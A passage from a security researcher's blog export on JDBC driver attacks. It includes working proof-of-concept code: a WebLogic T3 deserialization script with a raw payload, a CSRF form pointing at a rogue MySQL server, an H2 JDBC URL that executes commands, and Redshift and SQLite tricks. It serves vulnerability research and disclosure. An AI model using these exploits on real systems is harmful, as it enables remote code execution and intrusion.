{"meta":{"title":null,"subtitle":"","description":null,"author":"by pyn3rd","url":"http://yoursite.com","root":"/"},"pages":[{"title":"Repositories","date":"2022-10-11T02:47:37.579Z","updated":"2022-10-11T02:30:17.920Z","comments":false,"path":"repository/index.html","permalink":"http://yoursite.com/repository/index.html","excerpt":"","text":""},{"title":"about","date":"2022-10-12T01:59:54.000Z","updated":"2022-10-12T01:59:54.864Z","comments":true,"path":"about/index.html","permalink":"http://yoursite.com/about/index.html","excerpt":"","text":""},{"title":"tags","date":"2022-10-12T02:26:35.232Z","updated":"2022-10-12T02:26:35.228Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":""},{"title":"Search","date":"2022-10-12T02:06:40.192Z","updated":"2022-10-12T02:06:40.187Z","comments":true,"path":"search/index.html","permalink":"http://yoursite.com/search/index.html","excerpt":"","text":""},{"title":"categories","date":"2022-10-12T02:09:08.400Z","updated":"2022-10-12T02:09:08.392Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"Amazon Redshift JDBC Attack Trick","slug":"Amazon-Redshift-JDBC-Driver-Trick","date":"2022-06-29T14:24:15.000Z","updated":"2022-10-12T06:26:20.426Z","comments":true,"path":"2022/06/29/Amazon-Redshift-JDBC-Driver-Trick/","link":"","permalink":"http://yoursite.com/2022/06/29/Amazon-Redshift-JDBC-Driver-Trick/","excerpt":"","text":"Amazon Redshift JDBC Driver supports plenty of properties as well. https://docs.aws.amazon.com/redshift/latest/mgmt/options-for-providing-iam-credentials.html However, there are two special properties plugin_name and login_url. The plugin_name is used for providing IAM credentials. The Amazon Redshift JDBC driver includes SAML-based credential provider plugins. One of the plugins is for SAML MFA , the plugin class named com.amazon.redshift.plugin.BrowserSamlCredentialsProvider So set the breakpoint at the method openBrowser() of BrowserSamlCredentialsProvider class Apparently , the value of the property login_url steps into the method Desktop.getDesktop().browse() As we know, the method Desktop.getDesktop().browse() of the package java.awt will launch the default browser to display URI. Here is the sample for explanation image-20220629220156524.png Consequently, just set file:///System/Applications/Calculator.app as the value of property login_url, the default browser will display it. Here is the PoC 1234567891011121314import java.sql.DriverManager;import java.sql.SQLException;public class RedshiftDemo &#123; public static void main(String[] args) throws SQLException &#123; System.out.println(&quot;Amazon Redshift Driver Version: &quot; + com.amazon.redshift.jdbc42.Driver.class.getPackage().getSpecificationVersion()); DriverManager.registerDriver(new com.amazon.redshift.jdbc42.Driver()); DriverManager.getConnection(&quot;jdbc:redshift:iam://mycluster:us-west-2/dev?plugin_name=com.amazon.redshift.plugin.BrowserSamlCredentialsProvider&amp;login_url=file:///System/Applications/Calculator.app&quot;); &#125;&#125; image-20220629220815868.png Make JDBC Attacks Brilliant Again!","categories":[],"tags":[],"author":"pyn3rd"},{"title":"Weblogic SSRF via Deserialized Oracle JDBC Connection","slug":"Weblogic-SSRF-Involving-Deserialized-JDBC-Connection","date":"2022-06-18T05:55:42.000Z","updated":"2022-10-11T13:39:55.234Z","comments":true,"path":"2022/06/18/Weblogic-SSRF-Involving-Deserialized-JDBC-Connection/","link":"","permalink":"http://yoursite.com/2022/06/18/Weblogic-SSRF-Involving-Deserialized-JDBC-Connection/","excerpt":"","text":"0x01 ForewordsAs you know, I have researched the JDBC attacks for a long time. So I focus on the various attacks involving JDBC drivers. Today I write a short write-up about another way of JDBC attacking. 0x02There is a private method readObject in the class oracle.jdbc.pool.OraclePooledConnection of ojdbc driver. Debug step by step, you will find it trying to establish a JDBC connection with deserializing the serialized stream. Here I post the key steps. 0x03 PoC for Testingweblogic.py 123456789101112131415161718192021222324252627282930313233343536373839#!/usr/bin/pythonimport socketimport osimport sysimport structif len(sys.argv) &lt; 3: print(&#x27;Usage: python &#123;&#125; &lt;TARGET_HOST&gt; &lt;PORT&gt; &lt;/PATH/TO/PAYLOAD&gt;&#x27;.format(os.path.basename(sys.argv[0]))) sys.exit()sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)sock.settimeout(5)server_address = (sys.argv[1],int(sys.argv[2]))sys.stderr.write(&#x27;&#123;&#125; [+] Connecting to &#123;&#125; &#x27;.format(&#x27;\\r\\n&#x27;,server_address))sock.connect(server_address)# Send headersheaders=b&#x27;t3 10.3.6\\nAS:255\\nHL:19\\nMS:10000000\\nPU:t3://us-l-breens:7001\\n\\n&#x27;sys.stderr.write(&#x27;&#123;&#125; Sending &#123;&#125;&#x27;.format(&#x27;\\r\\n&#x27;,headers))sock.sendall(headers)data = sock.recv(1024)sys.stderr.write(&#x27;&#123;&#125; Received &#123;&#125;&#x27;.format(&#x27;\\r\\n&#x27;,data))payloadObj = open(sys.argv[3],&#x27;rb&#x27;).read()payload=b&#x27;\\x00\\x00\\x09\\xf3\\x01\\x65\\x01\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x71\\x00\\x00\\xea\\x60\\x00\\x00\\x00\\x18\\x43\\x2e\\xc6\\xa2\\xa6\\x39\\x85\\xb5\\xaf\\x7d\\x63\\xe6\\x43\\x83\\xf4\\x2a\\x6d\\x92\\xc9\\xe9\\xaf\\x0f\\x94\\x72\\x02\\x79\\x73\\x72\\x00\\x78\\x72\\x01\\x78\\x72\\x02\\x78\\x70\\x00\\x00\\x00\\x0c\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x70\\x70\\x70\\x70\\x70\\x70\\x00\\x00\\x00\\x0c\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x70\\x06\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x1d\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x43\\x6c\\x61\\x73\\x73\\x54\\x61\\x62\\x6c\\x65\\x45\\x6e\\x74\\x72\\x79\\x2f\\x52\\x65\\x81\\x57\\xf4\\xf9\\xed\\x0c\\x00\\x00\\x78\\x70\\x72\\x00\\x24\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x50\\x61\\x63\\x6b\\x61\\x67\\x65\\x49\\x6e\\x66\\x6f\\xe6\\xf7\\x23\\xe7\\xb8\\xae\\x1e\\xc9\\x02\\x00\\x09\\x49\\x00\\x05\\x6d\\x61\\x6a\\x6f\\x72\\x49\\x00\\x05\\x6d\\x69\\x6e\\x6f\\x72\\x49\\x00\\x0b\\x70\\x61\\x74\\x63\\x68\\x55\\x70\\x64\\x61\\x74\\x65\\x49\\x00\\x0c\\x72\\x6f\\x6c\\x6c\\x69\\x6e\\x67\\x50\\x61\\x74\\x63\\x68\\x49\\x00\\x0b\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x50\\x61\\x63\\x6b\\x5a\\x00\\x0e\\x74\\x65\\x6d\\x70\\x6f\\x72\\x61\\x72\\x79\\x50\\x61\\x74\\x63\\x68\\x4c\\x00\\x09\\x69\\x6d\\x70\\x6c\\x54\\x69\\x74\\x6c\\x65\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x4c\\x00\\x0a\\x69\\x6d\\x70\\x6c\\x56\\x65\\x6e\\x64\\x6f\\x72\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x0b\\x69\\x6d\\x70\\x6c\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x71\\x00\\x7e\\x00\\x03\\x78\\x70\\x77\\x02\\x00\\x00\\x78\\xfe\\x01\\x00\\x00&#x27;payload=payload+payloadObjpayload=payload+b&#x27;\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x1d\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x43\\x6c\\x61\\x73\\x73\\x54\\x61\\x62\\x6c\\x65\\x45\\x6e\\x74\\x72\\x79\\x2f\\x52\\x65\\x81\\x57\\xf4\\xf9\\xed\\x0c\\x00\\x00\\x78\\x70\\x72\\x00\\x21\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x50\\x65\\x65\\x72\\x49\\x6e\\x66\\x6f\\x58\\x54\\x74\\xf3\\x9b\\xc9\\x08\\xf1\\x02\\x00\\x07\\x49\\x00\\x05\\x6d\\x61\\x6a\\x6f\\x72\\x49\\x00\\x05\\x6d\\x69\\x6e\\x6f\\x72\\x49\\x00\\x0b\\x70\\x61\\x74\\x63\\x68\\x55\\x70\\x64\\x61\\x74\\x65\\x49\\x00\\x0c\\x72\\x6f\\x6c\\x6c\\x69\\x6e\\x67\\x50\\x61\\x74\\x63\\x68\\x49\\x00\\x0b\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x50\\x61\\x63\\x6b\\x5a\\x00\\x0e\\x74\\x65\\x6d\\x70\\x6f\\x72\\x61\\x72\\x79\\x50\\x61\\x74\\x63\\x68\\x5b\\x00\\x08\\x70\\x61\\x63\\x6b\\x61\\x67\\x65\\x73\\x74\\x00\\x27\\x5b\\x4c\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2f\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2f\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2f\\x50\\x61\\x63\\x6b\\x61\\x67\\x65\\x49\\x6e\\x66\\x6f\\x3b\\x78\\x72\\x00\\x24\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x49\\x6e\\x66\\x6f\\x97\\x22\\x45\\x51\\x64\\x52\\x46\\x3e\\x02\\x00\\x03\\x5b\\x00\\x08\\x70\\x61\\x63\\x6b\\x61\\x67\\x65\\x73\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x0e\\x72\\x65\\x6c\\x65\\x61\\x73\\x65\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x5b\\x00\\x12\\x76\\x65\\x72\\x73\\x69\\x6f\\x6e\\x49\\x6e\\x66\\x6f\\x41\\x73\\x42\\x79\\x74\\x65\\x73\\x74\\x00\\x02\\x5b\\x42\\x78\\x72\\x00\\x24\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x50\\x61\\x63\\x6b\\x61\\x67\\x65\\x49\\x6e\\x66\\x6f\\xe6\\xf7\\x23\\xe7\\xb8\\xae\\x1e\\xc9\\x02\\x00\\x09\\x49\\x00\\x05\\x6d\\x61\\x6a\\x6f\\x72\\x49\\x00\\x05\\x6d\\x69\\x6e\\x6f\\x72\\x49\\x00\\x0b\\x70\\x61\\x74\\x63\\x68\\x55\\x70\\x64\\x61\\x74\\x65\\x49\\x00\\x0c\\x72\\x6f\\x6c\\x6c\\x69\\x6e\\x67\\x50\\x61\\x74\\x63\\x68\\x49\\x00\\x0b\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x50\\x61\\x63\\x6b\\x5a\\x00\\x0e\\x74\\x65\\x6d\\x70\\x6f\\x72\\x61\\x72\\x79\\x50\\x61\\x74\\x63\\x68\\x4c\\x00\\x09\\x69\\x6d\\x70\\x6c\\x54\\x69\\x74\\x6c\\x65\\x71\\x00\\x7e\\x00\\x05\\x4c\\x00\\x0a\\x69\\x6d\\x70\\x6c\\x56\\x65\\x6e\\x64\\x6f\\x72\\x71\\x00\\x7e\\x00\\x05\\x4c\\x00\\x0b\\x69\\x6d\\x70\\x6c\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x71\\x00\\x7e\\x00\\x05\\x78\\x70\\x77\\x02\\x00\\x00\\x78\\xfe\\x00\\xff\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x13\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x4a\\x56\\x4d\\x49\\x44\\xdc\\x49\\xc2\\x3e\\xde\\x12\\x1e\\x2a\\x0c\\x00\\x00\\x78\\x70\\x77\\x46\\x21\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x09\\x31\\x32\\x37\\x2e\\x30\\x2e\\x31\\x2e\\x31\\x00\\x0b\\x75\\x73\\x2d\\x6c\\x2d\\x62\\x72\\x65\\x65\\x6e\\x73\\xa5\\x3c\\xaf\\xf1\\x00\\x00\\x00\\x07\\x00\\x00\\x1b\\x59\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x78\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x13\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x4a\\x56\\x4d\\x49\\x44\\xdc\\x49\\xc2\\x3e\\xde\\x12\\x1e\\x2a\\x0c\\x00\\x00\\x78\\x70\\x77\\x1d\\x01\\x81\\x40\\x12\\x81\\x34\\xbf\\x42\\x76\\x00\\x09\\x31\\x32\\x37\\x2e\\x30\\x2e\\x31\\x2e\\x31\\xa5\\x3c\\xaf\\xf1\\x00\\x00\\x00\\x00\\x00\\x78&#x27;# adjust header for appropriate message lengthpayload=struct.pack(&#x27;&gt;I&#x27;,len(payload)) + payload[4:]print(&#x27;[+] Sending payload...&#x27;)sock.send(payload)data = sock.recv(1024)sys.stderr.write(&#x27;&#123;&#125; Received &#123;&#125;&#x27;.format(&#x27;\\r\\n&#x27;,data)) WeblogicOJDBC.java 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import oracle.jdbc.internal.OpaqueString;import oracle.jdbc.pool.OraclePooledConnection;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.util.Properties;public class WeblogicOJDBC &#123; public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException, IOException &#123; Properties properties = new Properties(); properties.setProperty(&quot;InactivityTimeout&quot;, &quot;10&quot;); Class&lt;?&gt; clazz = Class.forName(&quot;oracle.jdbc.driver.OracleDriverExtension&quot;); Class&lt;?&gt; clazz1 = Class.forName(&quot;oracle.jdbc.driver.T4CConnection&quot;); Class&lt;?&gt; clazz2 = Class.forName(&quot;oracle.jdbc.driver.GeneratedPhysicalConnection&quot;); Constructor&lt;?&gt; declaredConstructor1 = clazz1.getDeclaredConstructor(String.class, Properties.class, clazz); declaredConstructor1.setAccessible(true); Object object = declaredConstructor1.newInstance(&quot;jdbc:oracle:thin:@localhost:1521:orcl&quot;, properties, null); Constructor&lt;OpaqueString&gt; declaredConstructor = OpaqueString.class.getDeclaredConstructor(String.class); declaredConstructor.setAccessible(true); OpaqueString opaqueString = declaredConstructor.newInstance(&quot;pyn3rd&quot;); Field password = clazz1.getDeclaredField(&quot;password&quot;); password.setAccessible(true); password.set(object, opaqueString); Field userName = clazz2.getDeclaredField(&quot;userName&quot;); userName.setAccessible(true); userName.set(object, &quot;root&quot;); OraclePooledConnection oraclePooledConnection = new OraclePooledConnection(); Field physicalConn = oraclePooledConnection.getClass().getDeclaredField(&quot;physicalConn&quot;); physicalConn.setAccessible(true); physicalConn.set(oraclePooledConnection, object); FileOutputStream fos = new FileOutputStream(&quot;ojdbc.ser&quot;); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(oraclePooledConnection); &#125;&#125;","categories":[],"tags":[],"author":"pyn3rd"},{"title":"Make JDBC Attacks Brilliant Again I","slug":"Make-JDBC-Attacks-Brillian-Again-I","date":"2022-06-06T09:35:53.000Z","updated":"2022-06-14T06:23:47.406Z","comments":true,"path":"2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/","link":"","permalink":"http://yoursite.com/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/","excerpt":"","text":"0x01 ForewordsIn HITB Singapore 2021, we made a presentation about JDBC attacks.Here is the detailed write-up about the talk. 0x02 JDBC IntroductionThe JDBC API is a Java API that can access any kind of tabular data, especially data stored in a relational database. JDBC helps you to write Java applications that manage these three programming activities: Connect to a data source, like a database Send queries and update statements to the database Retrieve and process the results received from the database in answer to your query Actually, JDBC is a set of standard interfaces and a particular relational database has its own implement, like JDBCMysqlImpl in MySQL JDBC driver. I draw the following picture to describe these implements. It is mainly in the java.sql package in JDK, JDBC drivers are client-side adapters , installed in the client endpoint, not in the server side. It can convert requests from Java programs to a protocol that the DBMS can understand.JDBC drivers provide JDBC specific implementations for different databases . For developers, JDBC helps shield the specifics of individual databases. The following simple code fragment gives an example. The short code fragment instantiates a DriverManager object to connect to a database driver and log into the database. It occured to me that if the JDBC URL is under control, what will take place? According to the above picture, the basic attack assumptive steps are as follow: Sets a malicious JDBC URL and triggers the JDBC connection. As the client side, it connects to the malicious server which specified by the attacker with JDBC driver. Take advantage of the security flaws or some particular properties of the JDBC drivers to trigger these vulnerabilities. Before my new research, I focus on some disclosed cases. So it starts with the in-depth analysis of the historical vulnerablities. 0x03 Review Historical IssuesMySQL Client Arbitrary File Reading VulnerabilityThis vulnerability is caused by the existed MySQL feature for a long time. The feature is that the Load Data Local Infile statement can read client files and send them to the server. There is no doubt that this feature is very risky. The MySQL official document clearly states that clients should not connect to any untrusted server. To tell the truth, is that it’s always hard to make sure. And since this is the specification of MySQL, it can affect most clients, including the MySQL JDBC driver. An attacker can forge a malicious MySQL server and after the client connecting, the client will send some initializing query packets such as sending query to SET NAMES with charset utf-8, then the malicious server can send a file transfer packet specifying to read any file from the client. MySQL JDBC Client Deserialization VulnerabilityActually the MySQL JDBC deserialization vulnerability was firstly mentioned by Thijs Alkemade in 2017. This report named Unexpected automatic deserialisation of Java objects was assinged as CVE-2017-3523 eventually. Until 2019, a further research is disclosed by ZhangYang and his team mates. They made a presentation named &lt;New Exploit Technique In Java Deserialization Attack&gt; in Black Hat Europe. When MySQL JDBC directly deserializes certain types of data returned from the server, It can result in a remote code execution if the gadgets are appropriate. Using the statementInterceptors property provided by the JDBC driver, you can set an interceptor to perform additional operations before or after the certain kinds of statements. The full attacking chains are as follows Firstly, set the statementInterceptor attribute to ServerStatusDiffInterceptor, auditing ServerStatusDiffInterceptor code, you can see that this interceptor allows the client to send specific queries to the server, In addition, the getObject method is used to process the returned column. Secondly, in the getObject method, the driver will directly call the readObject method for deserialization of binary and blob types. Therefore, the server side controlled by the attacker can trigger deserialization vulnerabilities as long as it returns falsified serialized data. Of course, the class and property names of interceptors are different in various version of JDBC driver as shown in the table. Weblogic RCE involving MySQL JDBC DeserializationI look for some real world scenarios of MySQL JDBC connection configuration. I suddenly realize that data source can be specified by user in Weblogic server console and MySQL JDBC driver is built-in.Consequently I can customize the JDBC URL with some particular properties. And then I analyze the Weblogic server source code to make sure that. Unfortunately, it needs the authorization. I hope to make it much more harmful, then I figure out there is no CSRF token check of createJDBCDataSourceForm. Eventually, I construct the PoC like this 123456789101112&lt;html&gt;&lt;body&gt;&lt;form name =&quot;wls&quot; target=&quot;frame&quot; action=&quot;http://weblogic-server-ip:7001/console/console.portal?CreateGlobalJDBCDataSourcePortlet_actionOverride=/com/bea/console/actions/jdbc/datasources/createjdbcdatasource/testConnectionConfiguration&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;CreateGlobalJDBCDataSourcePortletdriverClassName&quot; value=&quot;com.mysql.jdbc.Driver&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;CreateGlobalJDBCDataSourcePortleturl&quot; value=&quot;jdbc:mysql://rogue-mysql-server-ip:3306/demo?user=root&amp;password=password&amp;characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&quot; /&gt;&lt;/form&gt;&lt;iframe name=&quot;frame&quot; style=&quot;display:none&quot;&gt;&lt;/iframe&gt;&lt;script&gt;document.wls.submit()&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; When the administrator clicks the link of the above HTML page, the remote code will executed. I reported the bugs to Oracle. Then CVE number are assigned as CVE-2020-2869, CVE-2020-2934. SpringBoot H2 Console RCE with JDBC DriverWhen SpringBoot H2 database console is enabled, we can access the endpoit /h2-console/ to administrate the H2 database with a web page. However,the JDBC URL of H2 database is on supportive of the INIT parameter. It can be utilized to execute an initialization SQL sentence, meanwhile, an external SQL script can be imported by RUNSCRIPT FROM. Here is the illustration in SpringBoot H2 console First of all, we have to review the source code to figure out why we use the RUNSCRIPT FROM statement. During debugging the source code, we know that the INIT property is on supportive of executing any SQL statement, but you have to merge multiple SQL sentences into one. So we naturally choose RUNSCRIPT FROM key word to invoke a remote SQL script. Refer to the illustration, there is a disadvantage that a HTTP request is required with RUNSCRIPT FROM key word. Usually establishing a HTTP protocol request to the external network is forbbiden. After further testing, I find another way of using \\ to translate ;. multiple sentences are merged into one, that meets all our requirements. 12jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS &#x27;String shellexec(String cmd) throws java.io.IOException &#123;Runtime.getRuntime().exec(cmd)\\;return &quot;test&quot;\\;&#125;&#x27;\\;CALL EXEC(&#x27;open -a calculator&#x27;) Of course, we can use other sentences. The CREATE ALIAS Function key words are combined with an additional CALL key word in multiple SQL sentences, but they are both necessary in the same time. After more in-depth analyses of the source code. We find that the JAVA METHOD defined in CREATE ALIAS AS sentence is all handled by the method SourceCompiler. It supports three kinds of processing logic, Java, JavaScript and Groovy, all of which are compiled in order to finally execute the ALIAS function. The parseClass of Groovy catches my eye and it occurs to me that Orange Tsai made a presentation named &lt;Hacking Jenkins Part 2&gt; in 2019. Is is about abusing meta programming. Here is the official introduction about the @asttest annotation. It is triggered by parseClass method. Finally we can execute malicious java code in assertions. However, in the real world, Groovy dependencies are not built into H2 database environment. So this attack depends on whether Groovy components are included into the application. Obviously it does not make sense. So we continue to look for another way to attack, reviewing the source code, we quickly discover that in addition to the CREATE ALIAS AS sentence, there is another sentence can input a customized source code. In the parsing of the CREATE Trigger statement, finally, we can call loadFromSource method of the TriggerObject class. We are pleasantly surprised to find that in this method, the javascript source code is not only compiled but also executed. As the source code showing, it calls the eval() method directly. And since ScriptEngine is finally used for execution with no sandbox implement, we could input any java class fragment we wanted in javascript. So with this, we can easily achieve the purpose of RCE without the CALL or other sentences. As the PoC shows,JavaScript scripts start with JavaScript comments, and then we can then simply use java.lang.Runtime.getRuntime().exec() method to achieve RCE. JBoss /Wildfly Server Console RCE with JDBC DriverHere is another sample we use H2 database JDBC driver to execute remote malicious code, you can refer to the SpringBoot H2 RCE sample. IBM DB2 RCE with JDBC DriverAfter the above research, I realize some properties of JDBC driver could directly lead to vulnerablities. I read the official documents of IBM DB2 JDBC driver to search the potential suspicious properties. I noticed a property called clientRerouteServerListJNDIName, the official description as follows As described in the document, if the first connection to the data source fails, this property will provide an alternative server location.The Lookup method of the context is finally called for performing a JNDI lookup according to the source code fragment. So it is easy to imagine that if a malicious JNDI location is provided and the client fails to the connect the first location, then it will look up the second malicious JNDI location. Obviously, it is a well-known JNDI injection vulnerability. When the client connects to the malicious LDAP server, it will load the malicious java class from the remote codebase.Here is the final PoC ModeShape RCE with JDBC DriverModeShape is a lightweight, fast, and pluggable JCR repository that federates and unifies content from multiple systems, including files systems, databases, configuration files, other repositories, services, applications, and data grids. The full name of JCR is Content Repository API for Java is a specification for a Java platform application programming interface API to access content repositories in a uniform manner. Using the JCR API, you can get data from a variety of different systems, including file systems, relational databases and so on. A standard JCR connection for ModeShape is in the format shown bellow, which requires repositoryName to make a connection to an existing repository. In this way, the JNDI string in the connection URL gets our attention, and we reasonably assume that in addition to supporting the JCR protocol, other protocols such as LDAP should also be supported. After futher testing, it turns out that we can indeed initiate a JNDI lookup request to a specified LDAP server, so this is another typical JNDI injection vulnerability. Apache Derby with JDBC DriverApache Derby is an open source relational database implemented entirely in java. It can be used as an embedded database just like H2 database. With embedded databases, it is usually easier to implement attacks because the server and client can exist in the same project. We find a suspicious java code fragment when we look for sensitive calls in the Apache Derby driver code.There is a readMessage method in the SocketConnection class. The readObject method is invoked directly, which is always used to deserialize input stream in java. This code fragment obviously exists a deserialization vulnerability. In fact, from a security code point of view, this SocketConnection class is suspicious. You can see from its construct method, it wraps a socket and wraps socket Outputstream and Inputstream into object OutputStream and ObjectInputStream. The readMessage method seems to read and parse the socket Inputstream. If we can communicate with the wrapped socket, then we will probably be able to trigger the deserialization vulnerability. So we go back to the invocation chains and see how to call the readMessage method.We find that the caller is the inner class MasterReceiverThread of ReplicationMessageTransmit class. As you can guess from the class names and package names. These code fragments are relate to Apache Derby feature to replicate databases. I go through the Apache Derby documentation section on replicating databases and know that database replication can be initiated with JDBC connection property, which is exactly what we need. Also the connection property is controllable. In fact, if you go all the way up the call chain, you can see that whether this thread is started depends on whether the startMaster property is enabled. As the code showing, isStartReplicationMasterBoot method used for judgment. And in the code ,we can find that we can specify which host the socket connects to by controlling the slaveHost property. So we can set the startMaster property as true and the slaveHost property to the malicious server, then Apache Derby will try to connect to the malicious slave server and communicate with each other. At this point, the responsed malicious serialization data stream will be automatically deserialized, thus achieving the RCE purpose. The malicious connection PoC in the following code And the evil slave sever code is as follows Obviously the evil slave sever can return the serialized data directly after the connection receiving. SQLite RCE with JDBC DriverSQLite is also a lightweight embedded database. How to exploit it? we look up the code for its connection and find that when the JDBC URL is controllable, then we can customize its resourceName in the open method as follows Stepping into the extractResource method, we can see that the URL constructed by resourceName calls openStream method , so this can be used to achieve the SSRF attack as follow, 1jdbc:sqlite::resource:http://127.0.0.1:8888/poc1.db Send an HTTP request to specific ip address with JDBC connection. However, SSRF attack is not stratified our purpose. Using the resource subprotocol of SQLite, you can connect to the specified IP to download the specific database files, that is, if the JDBC URL is under our control, we can control the database files which the client side opens.With these clues, how should we attack? Referring to &lt;SELECT code_execution FROM * USING SQLite&gt; which descripts how to gain code execution using a malicious SQLite database. We can consider a scenario that there is a controllable JDBC URL and an uncontrollable SELECT statement. A brief code is shown in the figure. The URL is controllable, but the SQL statement executed are not controllable. In the controllable database file, there is a Data Definition Languae (DDL) statements used to CREATE TABLE or VIEW. The DDL statements actually appear as a plain text. If we inspect that the uncontrollable statement is SELECT * from TABLE, we can CREATE VIEW names pyn3rd to hijack the SELECT statement to execute a subquery customized in the CREATE VIEW DDL file. In this way, we can transform the SQL statement that we cannot control into the query statement that we can control. The next step, if we have a controllable JDBC URL connection, we can enable the load_extension option in SQLite. So if we have a controlled file, we can archive RCE purpose by loading this extension. In fact, the extension is a Dynamic Link Library or Shared Object. In SELECT statement, load_extension function can load a .ddl or .so file and execute sqlite3_extension_init function in it. So input the malicious code in sqlite3_extension_init function can trigger the remote code excution. Actually getting a manageable file is not always easy. Since Sqlite often bursts memory corruptions vulnerabilities, we can use these memory corruptions to attack. As shown in the code bellow, we can use Magellan PoC to create a local SQLite database with a malicious security VIEW. The Magellan is a number of vulnerabilities that exist in SQLite caused by memory corruptions.Specify a JDBC connection to download our database file and open it. When the code executes to query for security table, it will trigger a JVM crash. However, RCE is the final objective. Here is the PoC Open Source Project JDBC Attack Defense PolicyAccording to the previous attack methods, we can find that vulnerabilities usually appear in some special JDBC properties. So some open source projects take the method of filtering sensitive properties to fix such vulnerabilities. Apache Druid as well as Apache DolphinScheduler have been exposed to MySQL JDBC deserialization vulnerabilities in the past, so we focus on the two open source softwares . The CVE numbers for the two vulnerabilities are CVE-2021-26919 and CVE-2020-11974. Apache Druid defines a whitelist of properties. Only the properties in the whitelist are permitted. Otherwise, Apache DolphinScheduler removes sensitive properties from parameters. Is there a new exploitable way to bypass property filter? We choose Apache Druid, which uses the MySQL-connector-5.1.48 as our target. For this fix, the first idea is to see if the filter parameters method is consistent with the JDBC connection processing parameters method. You can see in the Apache Druid source code that the filter use the MySQL connector default parse URL method.By default they are consistent. Therefore, we jump out of this idea and take a look at the overall JDBC Driver loading logic. For the loading of JDBC Driver, they use SPI technology.full name is Java Service Provider Interface. For JDBC, all registered drivers are stored in the java.sql.Driver.In 5.1.48 versions of MySQL connector ,there are two registerd drivers, one is the common JDBC driver, the other is FabricMySQLDriver. This FabricMySQLDriver has caught our attention. Refer to the MySQL driver documentation, you can see that FabricMySQLDriver is used to connect to the MySQL Fabric System. MySQL Fabric is a system for managing a farm of MySQL servers. We start researching in the source code of FabricMySQLDriver.If you pass in a URL that starts with the format as the code showing, it goes into the Fabric Driver processing logic. You can see that in the code the connection URL is concated by the FabricProtocol, Host and Port parameters. Trace the FabricProtocol parameter,We can 